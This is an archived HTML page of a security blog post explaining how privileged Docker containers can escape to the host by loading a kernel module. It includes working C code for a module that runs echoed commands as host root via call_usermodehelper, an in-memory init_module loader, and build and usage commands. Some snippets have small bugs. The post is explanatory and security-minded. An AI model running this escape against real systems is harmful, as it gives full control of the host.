@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Privileged Container Escapes with Kernel Modules :: TheXcellerator</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="In all the playing around I&amp;rsquo;ve been doing with Linux kernel modules, I decided to see what would happen if you tried to load one from a Docker container. It turns out that privileged containers (or just those with CAP_SYS_MODULE) are able to use the sys_init_module() and sys_finit_module() syscalls - which are what&amp;rsquo;s used to load kernel modules. As all containers share their kernel with the host (unlike VMs), this clearly results in yet another complete system compromise." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/docker_escape/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="TheXcellerator" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Privileged Container Escapes with Kernel Modules :: TheXcellerator">
+<meta property="og:description" content="In all the playing around I&amp;rsquo;ve been doing with Linux kernel modules, I decided to see what would happen if you tried to load one from a Docker container. It turns out that privileged containers (or just those with CAP_SYS_MODULE) are able to use the sys_init_module() and sys_finit_module() syscalls - which are what&amp;rsquo;s used to load kernel modules. As all containers share their kernel with the host (unlike VMs), this clearly results in yet another complete system compromise." />
+<meta property="og:url" content="/posts/docker_escape/" />
+<meta property="og:site_name" content="Privileged Container Escapes with Kernel Modules" />
+
+  
+    <meta property="og:image" content="/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+  <meta property="article:section" content="linux" />
+
+
+  <meta property="article:published_time" content="2020-09-27 10:00:00 &#43;0100 BST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    TheXcellerator
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/categories/cryptography/">Cryptography</a></li>
+        
+      
+        
+          <li><a href="/categories/linux/">Linux</a></li>
+        
+      
+        
+          <li><a href="/categories/other/">Other</a></li>
+        
+      
+        
+          <li><a href="/categories/reverse_engineering/">Reverse Engineering</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/categories/cryptography/">Cryptography</a></li>
+      
+    
+      
+        <li><a href="/categories/linux/">Linux</a></li>
+      
+    
+      
+        <li><a href="/categories/other/">Other</a></li>
+      
+    
+      
+        <li><a href="/categories/reverse_engineering/">Reverse Engineering</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/docker_escape/">Privileged Container Escapes with Kernel Modules</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2020-09-27
+    </span>
+    
+    
+    <span class="post-author">::
+      TheXcellerator
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="/tags/privileged/">privileged</a>&nbsp;
+    
+    #<a href="/tags/docker/">docker</a>&nbsp;
+    
+    #<a href="/tags/container/">container</a>&nbsp;
+    
+    #<a href="/tags/escape/">escape</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>In all the playing around I&rsquo;ve been doing with Linux kernel modules, I decided to see what would happen if you tried to load one from a Docker container. It turns out that privileged containers (or just those with <code>CAP_SYS_MODULE</code>) are able to use the <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_init_module()</code></a> and <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_finit_module()</code></a> syscalls - which are what&rsquo;s used to load kernel modules. As all containers share their kernel with the host (unlike VMs), this clearly results in yet another complete system compromise.</p>
+<p>While this isn&rsquo;t big news (it&rsquo;s not the first privileged container escape, and certainly won&rsquo;t be the last), I did find it interesting that loading kernel modules was possible from Docker at all. As Twitter use <a href="https://twitter.com/_skyr/status/1309865642821124096">@_skyr pointed out</a> the <a href="https://www.docker.com/blog/docker-can-now-run-within-docker/">announcement</a> of privileged mode in Docker 0.6 was described as:</p>
+<blockquote>
+<p>&ldquo;It allows you to run some containers with (almost) all the capabilities of their host machine, regarding kernel features and device access.&rdquo;</p>
+</blockquote>
+<p>While just knowing that a container can load a kernel module into the host is enough to conclude that a system compromise is possible, I wanted to scratch the itch to actually write something that proved it worked.</p>
+<h1 id="code-execution-from-the-kernel">Code Execution From The Kernel<a href="#code-execution-from-the-kernel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>My rough thinking was to implement some kind of interface that would let me talk to the kernel module from the container&rsquo;s userspace, and then execute commands based on that. The simplest thing I could come up with to get information to the module was to write a procfs entry that would show up under <code>/proc</code>, the idea being that I could just <code>echo</code> commands to <code>/proc/escape</code> and have them execute.</p>
+<p>If you&rsquo;ve not seen them before, procfs entries are pretty simple to set up. Whenever you perform some file operation (open/close/read/write/seek/etc) on a proc file, a corresponding function gets called. Which functions get called according to which operation essentially makes up the definition of the proc entry. If we want to write our own, we just have to write the handlers for the operations that we want to support (we&rsquo;re only interested in reading and writing), and tell the kernel how we want the proc file to react when it gets prodded by userspace.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/proc_fs.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+MODULE_LICENSE(<span style="color:#e6db74">&#34;GPL&#34;</span>);
+MODULE_AUTHOR(<span style="color:#e6db74">&#34;Xcellerator&#34;</span>);
+MODULE_DESCRIPTION(<span style="color:#e6db74">&#34;Simple Procfs&#34;</span>);
+MODULE_VERSION(<span style="color:#e6db74">&#34;0.01&#34;</span>);
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * This struct will store all the information about the entry
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">struct</span> proc_dir_entry <span style="color:#f92672">*</span>proc_file_entry_simple;
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * We need a function to handle writes to /proc/simple
+</span><span style="color:#75715e"> */</span>
+ssize_t <span style="color:#a6e22e">simple_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t len, loff_t <span style="color:#f92672">*</span>offset)
+{
+    <span style="color:#75715e">/* handle a write */</span>
+    
+    <span style="color:#66d9ef">return</span> len;
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * We need a function to handle reads from /proc/simple
+</span><span style="color:#75715e"> */</span>
+ssize_t <span style="color:#a6e22e">simple_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t len, loff_t <span style="color:#f92672">*</span>offset)
+{
+    <span style="color:#75715e">/* handle a read */</span>
+
+    <span style="color:#66d9ef">return</span> len;
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * Store pointers to the read/write functions in a file_operations struct
+</span><span style="color:#75715e"> * Note that handlers for open/close/etc are also allowed
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> file_operations proc_file_fops_simple <span style="color:#f92672">=</span> {
+    .owner <span style="color:#f92672">=</span> THIS_MODULE,
+    .write <span style="color:#f92672">=</span> simple_write,
+    .read <span style="color:#f92672">=</span> simple_read,
+};
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * This function gets called when we load the module
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init <span style="color:#a6e22e">simple_init</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * Install the proc file with permissions 0666 (so we can read/write to it)
+</span><span style="color:#75715e">     */</span>
+    proc_file_entry_simple <span style="color:#f92672">=</span> proc_create(<span style="color:#e6db74">&#34;simple&#34;</span>, <span style="color:#ae81ff">0666</span>, NULL, <span style="color:#f92672">&amp;</span>proc_file_fops_simple);
+
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * Check it didn&#39;t fail
+</span><span style="color:#75715e">     */</span>
+    <span style="color:#66d9ef">if</span>( proc_file_entry_simple <span style="color:#f92672">==</span> NULL )
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * This function gets called when we unload the module
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit <span style="color:#a6e22e">simple_exit</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * Uninstall the proc file
+</span><span style="color:#75715e">     */</span>
+    remove_proc_entry(<span style="color:#e6db74">&#34;simple&#34;</span>, NULL);
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * Declare the init and exit functions
+</span><span style="color:#75715e"> */</span>
+module_init(simple_init);
+module_exit(simple_exit);
+</code></pre></div><blockquote>
+<p>If you&rsquo;d like to learn more about Linux kernel modules (particularly from a rootkit viewpoint), I have an ongoing series of posts starting <a href="../linux_rootkits_01/">here</a>.</p>
+</blockquote>
+<p>When I first started writing this, I imagined that the kernel being able to execute commands in userland would be a big no-no. It turns out that this is completely possible through the use of the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html"><code>call_usermodehelper()</code></a> function. Typically this function is used during the early boot process or in low level system functions that aren&rsquo;t normally exposed (e.g. <a href="https://github.com/torvalds/linux/blob/a1bffa48745afbb54cb4f873bba783b2ae8be042/arch/x86/kernel/cpu/mce/dev-mcelog.c#L81">here</a> and <a href="https://github.com/torvalds/linux/blob/a1bffa48745afbb54cb4f873bba783b2ae8be042/kernel/reboot.c#L433">here</a>). All we need to prepare for it are arrays of arguments (<code>argv</code>) and environment variables (<code>envp</code>). For the most part, I don&rsquo;t care about the environment variables, so we&rsquo;ll leave <code>envp[]</code> empty.</p>
+<p>At this point, you can probably guess where this is going: let&rsquo;s just <code>/bin/sh -c</code> anything that get&rsquo;s <code>echo</code>ed to our proc file and redirect the output somewhere we can read it! This is exactly what I did. The <code>escape_write()</code> function is handler for any read requests to <code>/proc/escape</code> (we don&rsquo;t need to read from <code>/proc/escape</code>, so there isn&rsquo;t any <code>escape_read()</code> function).</p>
+<blockquote>
+<p>For the unfamiliar, when we make a write request from userspace, we supply the kernel with a pointer to a buffer of data and the number of bytes it contains. The kernel then handles any middle-men between us and where we want the data to go (procfs handlers, disk IO, network sockets, etc). The return value is just the number of bytes that were successfully copied. (Read requests work in almost the same way, but in reverse - the buffer we supply gets filled with bytes instead).</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+</span><span style="color:#75715e"> * We make argv[] and envp[] global variables so that we can use them in any
+</span><span style="color:#75715e"> * function we like and their values will persist until we want them to change
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[<span style="color:#ae81ff">2</span>];
+<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>envp[<span style="color:#ae81ff">3</span>];
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * When /proc/escape is written to, a buffer containing the bytes are passed
+</span><span style="color:#75715e"> * to the escape_write() as well as the length of that buffer
+</span><span style="color:#75715e"> */</span>
+ssize_t <span style="color:#a6e22e">escape_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t len, loff_t <span style="color:#f92672">*</span>offset)
+{
+    <span style="color:#66d9ef">int</span> ret;
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf <span style="color:#f92672">=</span> NULL;
+    <span style="color:#66d9ef">long</span> error;
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>suffix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34; &gt; /proc/output&#34;</span>;
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>command;
+
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * The kernel cannot directly read the buffer supplied by userspace,
+</span><span style="color:#75715e">     * (thanks to virtual memory) so we have to copy it into a kernel buffer
+</span><span style="color:#75715e">     * (kbuf) instead before using it.
+</span><span style="color:#75715e">     *
+</span><span style="color:#75715e">     * kzalloc() is similar to malloc(), but also takes a flag to indicate
+</span><span style="color:#75715e">     * that this buffer will be used by the kernel.
+</span><span style="color:#75715e">     * 
+</span><span style="color:#75715e">     * copy_from_user() is similar to memcpy() and is used to copy data
+</span><span style="color:#75715e">     * from a userspace buffer into a kernel one.
+</span><span style="color:#75715e">     */</span>
+    kbuf <span style="color:#f92672">=</span> kzalloc(len, GFP_KERNEL);
+    error <span style="color:#f92672">=</span> copy_from_user(kbuf, buf, len<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+
+    <span style="color:#66d9ef">if</span>(error)
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * We have to set up the argv[] and envp[] arrays before calling
+</span><span style="color:#75715e">     * call_usermodehelper().
+</span><span style="color:#75715e">     * 
+</span><span style="color:#75715e">     * The command we&#39;ll be executing is &#34;/bin/sh -c $COMMAND &gt; /proc/output&#34;
+</span><span style="color:#75715e">     *
+</span><span style="color:#75715e">     * We allocate len+16 bytes to argv[2] to make room for the 16 bytes of
+</span><span style="color:#75715e">     * suffix[] that get appended for the shell redirect
+</span><span style="color:#75715e">     */</span>
+    argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span>;
+    argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-c&#34;</span>;
+    argv[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> kzalloc(len<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>, GFP_KERNEL);
+
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * Copy the kernel buffer (containing the command to execute) into argv[2]
+</span><span style="color:#75715e">     * (We have to chop off the &#39;\n&#39;, so only copy len-1 bytes)
+</span><span style="color:#75715e">     */</span>
+    strncpy(argv[<span style="color:#ae81ff">2</span>], kbuf, len<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+    strcat(argv[<span style="color:#ae81ff">2</span>], suffix);
+
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * Finally execute the command stored in argv
+</span><span style="color:#75715e">     *
+</span><span style="color:#75715e">     * handle_cmd() is a helper function that just checks that argv[0] isn&#39;t
+</span><span style="color:#75715e">     * empty and then calls call_usermodehelper() directly
+</span><span style="color:#75715e">     */</span>
+    ret <span style="color:#f92672">=</span> handle_cmd();
+    
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * Lastly, just free the buffers and return the number of bytes written (len)
+</span><span style="color:#75715e">     */</span>
+    kfree(kbuf);
+    kfree(command);
+    <span style="color:#66d9ef">return</span> len;
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * Helper function to call call_usermodehelper() with the global argv and envp
+</span><span style="color:#75715e"> * variables
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">handle_cmd</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#66d9ef">int</span> ret;
+
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * Check that we haven&#39;t been called before a command is set
+</span><span style="color:#75715e">     */</span>
+    <span style="color:#66d9ef">if</span> (argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> NULL)
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * Execute the command in argv[]
+</span><span style="color:#75715e">     */</span>
+    ret <span style="color:#f92672">=</span> call_usermodehelper(argv[<span style="color:#ae81ff">0</span>], argv, envp, UMH_WAIT_EXEC);
+    <span style="color:#66d9ef">return</span> ret;
+}
+</code></pre></div><p>If you read the above function carefully, you&rsquo;ll have noticed that the output of any command passed to <code>/bin/sh</code> is redirected to <code>/proc/output</code>. The reason for this is we have to redirect somewhere <em>relative to the host&rsquo;s root</em>, and <em>not the container</em>. We neither know where the root of the container is on the host, nor can we read anything outside of the container. We need a file that both the host and the container can read/write to - so let&rsquo;s just create another proc file!</p>
+<p>This is precisely the job that <code>/proc/output</code> does. When we write to it, it saves the bytes to a global <code>cmd_output</code> buffer, and when we read it, it just serves those bytes back to us! Yes, this &ldquo;clever&rdquo; trick to communicate with the host is just making a proc file act like a regular file - genius right&hellip;? (&lt;/s&gt;)</p>
+<p>You can take a look at <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.8_privileged_container_escaping/escape.c#L100"><code>output_write()</code></a> and <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.8_privileged_container_escaping/escape.c#L133"><code>output_read()</code></a> if you want, but they aren&rsquo;t really as interesting as the <code>escape</code> proc file is - after all, they&rsquo;re just emulating a regular file.</p>
+<p>Putting this all together, if you just compile <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.8_privileged_container_escaping/escape.c"><code>escape.c</code></a> with the standard kernel module Makefile:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Makefile" data-lang="Makefile">obj-m <span style="color:#f92672">+=</span> escape.o
+
+<span style="color:#a6e22e">all</span><span style="color:#f92672">:</span>
+	make -C /lib/modules/<span style="color:#66d9ef">$(</span>shell uname -r<span style="color:#66d9ef">)</span>/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>PWD<span style="color:#66d9ef">)</span> modules
+
+<span style="color:#a6e22e">clean</span><span style="color:#f92672">:</span>
+	make -C /lib/modules/<span style="color:#66d9ef">$(</span>shell uname -r<span style="color:#66d9ef">)</span>/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>PWD<span style="color:#66d9ef">)</span> clean
+</code></pre></div><p>Then you can load the module with <code>insmod escape.ko</code>. At this point you can start executing commands with <code>echo &quot;ps aux&quot; &gt; /proc/escape</code> and check the output with <code>cat /proc/output</code>! To make things look cooler in the screenshot, I wrote a little program <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.8_privileged_container_escaping/execute.c"><code>execute.c</code></a> to wait for input and handle all the reading/writing between proc files. It looks like a shell, but it really isn&rsquo;t - it doesn&rsquo;t even handle <code>stderr</code>! However, it is nicer than stringing together bash onliners.</p>
+<p>The only thing you might be left wondering is what if we don&rsquo;t have <code>kmod</code> installed (and so <code>insmod</code> and <code>rmmod</code> aren&rsquo;t available)? Pretty much any Docker container (including the official Ubuntu 20.04 one that I tested on) doesn&rsquo;t have this installed (because why on Earth would they?).</p>
+<h1 id="much-ado-about-kmod">Much Ado About Kmod<a href="#much-ado-about-kmod" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Back at the top of this post, I mentioned the <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_init_module()</code></a> and <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_finit_module()</code></a> syscalls. Well, <code>sys_finit_module()</code> is what normally gets used (e.g. by <code>insmod</code>) and it loads a kernel module by passing it a file descriptor to an open <code>.ko</code> file. We could do this, but the other option is to use <code>sys_init_module()</code> instead.</p>
+<p>This syscall takes a pointer to an array in memory where the <code>.ko</code> file is already loaded. This is great because we can just compile our kernel module, then stick its bytes into a C array (<code>xxd -i</code> is an incredible timesaver!), and call <code>init_module()</code> directly (we drop the <code>sys_</code> when we use syscalls in userspace)! It looks something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;syscall.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * escape_ko is the raw bytes of the .ko kernel object produced by
+</span><span style="color:#75715e"> * compiling the kernel module
+</span><span style="color:#75715e"> * escape_ko_len is size of the kernel module in bytes
+</span><span style="color:#75715e"> * args is an array of arguments needed by the module (we don&#39;t pass any args)
+</span><span style="color:#75715e"> *
+</span><span style="color:#75715e"> * escape_ko and escape_ko_len are just the raw output of &#34;xxd -i escape.ko&#34;
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> escape_ko <span style="color:#f92672">=</span> {
+    <span style="color:#ae81ff">0xde</span>, <span style="color:#ae81ff">0xad</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0xef</span>,
+    <span style="color:#75715e">/* etc */</span>
+};
+
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> escape_ko_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>;
+
+<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> args[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>;
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * Load the kernel module from memory with init_module()
+</span><span style="color:#75715e"> * (provided by including syscall.h)
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#66d9ef">int</span> result;
+    result <span style="color:#f92672">=</span> init_module(escape_ko, escape_ko_len, args);
+
+    <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+    {
+        printf(<span style="color:#e6db74">&#34;Error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Putting this all together and compiling it is handled by the awful mess in <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.8_privileged_container_escaping/Makefile">Makefile</a>. The end result is that you can just run <code>./escape</code> to load the kernel module in a container and then start interacting with <code>/proc/escape</code> and <code>/proc/output</code>.</p>
+<p><img src="/img/escape.png" alt="escape"></p>
+<h1 id="what-this-isnt">What this isn&rsquo;t<a href="#what-this-isnt" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>I feel the need to clear up and perhaps state the obvious that this is <em>not</em> a new security issue that needs to be fixed. We&rsquo;ve known for a long time that privileged Docker escapes are fairly trivial (Felix Wilhelm&rsquo;s classic <a href="https://twitter.com/_fel1x/status/1151487053370187776">tweetable solution</a> is one of my favourites). This all started with me noticing that privileged containers can load kernel modules. Knowing that this results in a complete compromise wasn&rsquo;t enough <em>for me</em>, so I decided to put this together to prove it.</p>
+<p>Does any of this mean people should stop using privileged containers altogether? No (but please not in production). But I do think it&rsquo;s something to keep in mind if you do run privileged containers anywhere - especially if you&rsquo;re doing so and trying to mitigate the existing vulnerabilities somehow, but <code>CAP_SYS_MODULE</code> is still fair game for some reason.</p>
+<p>Finally, please don&rsquo;t think that this is restricted to code execution! Indeed, being able to load a kernel module can result in far greater compromise than just code exec: <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.3_set_root">arbitrary root escalation</a>, hiding <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.4_hiding_directories">directories</a>, <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.5_hiding_processes">processes</a> and <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.6_hiding_ports">ports</a>, and even <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.7_char_interfering">cryptographic compromise</a> are all possible. Don&rsquo;t forget as well that the loaded modules persist even after the container is shutdown!</p>
+<h1 id="going-further">Going Further<a href="#going-further" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>If you&rsquo;re interested in learning more about kernel rootkits, then I recommend taking a look at my <a href="https://github.com/xcellerator/linux_kernel_hacking">Linux Kernel Rootkits</a> repo on GitHub. I&rsquo;ve also started writing a series of blog posts going into more detail on a variety of kernel rootkit techniques, which starts <a href="../linux_rootkits_01/">here</a>.</p>
+<p>Thanks for reading - until next time&hellip;</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/linux_rootkits_06/">
+                <span class="button__text">Linux Rootkits Part 6: Hiding Directories</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Harvey Phillips 2020 - London, England</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
